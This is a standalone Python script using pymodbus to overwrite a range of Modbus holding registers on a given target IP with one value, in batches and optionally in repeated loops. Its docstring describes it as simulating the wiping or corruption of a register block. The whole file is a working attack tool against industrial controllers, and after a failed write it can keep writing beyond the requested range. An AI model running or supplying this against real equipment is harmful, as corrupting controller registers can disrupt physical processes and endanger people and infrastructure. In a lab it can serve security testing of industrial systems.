#!/usr/bin/env python
"""
write_bulk.py - Overwrite a block of Modbus registers with a single value.

Uses FC 16 (Write Multiple Registers) to write a contiguous range of
registers. Simulates wiping or corrupting a register block.

Requires: pip install pymodbus
"""

import argparse
import sys
import time
from pymodbus.client import ModbusTcpClient


def run_once(client, start, count, value, unit):
    MAX_PER_REQ = 123  # FC 16 spec limit
    addr = start
    written = 0

    while written < count:
        batch = min(MAX_PER_REQ, count - written)
        values = [value] * batch
        result = client.write_registers(addr, values, slave=unit)

        if result.isError():
            print(f"  [-] Addr {addr}: FAILED ({result})")
        else:
            print(f"  [+] Addr {addr}-{addr + batch - 1}: wrote {batch} registers <- {value}")
            written += batch

        addr += batch

    return written


def main():
    parser = argparse.ArgumentParser(description="Bulk write holding registers (FC16)")
    parser.add_argument("target", help="Target IP")
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--count", type=int, default=100)
    parser.add_argument("--value", type=int, default=0)
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit", type=int, default=0)
    parser.add_argument("--loops", type=int, default=1)
    parser.add_argument("--sleep-between", type=float, default=0.0)
    args = parser.parse_args()

    if args.loops < 1:
        print("[!] loops must be >= 1", file=sys.stderr)
        sys.exit(1)

    client = ModbusTcpClient(args.target, port=args.port, timeout=2)
    if not client.connect():
        print(f"[!] Cannot connect to {args.target}:{args.port}")
        sys.exit(1)

    print(
        f"[*] Bulk writing regs {args.start}-{args.start + args.count - 1} <- {args.value} "
        f"on {args.target}:{args.port} unit={args.unit}\n"
    )

    total_written = 0
    for i in range(args.loops):
        if args.loops > 1:
            print(f"\n[*] Loop {i + 1}/{args.loops}")
        total_written += run_once(client, args.start, args.count, args.value, args.unit)
        if i + 1 < args.loops and args.sleep_between > 0:
            time.sleep(args.sleep_between)

    client.close()
    print(f"\n[*] Done - wrote {total_written} registers across {args.loops} loop(s)")


if __name__ == "__main__":
    main()
